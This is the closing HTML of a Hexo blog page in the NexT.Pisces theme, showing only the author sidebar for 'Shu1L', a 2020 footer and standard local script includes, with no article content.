      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/header.jpg"
                alt="Shu1L" />
            
              <p class="site-author-name" itemprop="name">Shu1L</p>
              <p class="site-description motion-element" itemprop="description">欢迎来到Shu1L的神秘小屋！</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">46</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">29</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Shu1L</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
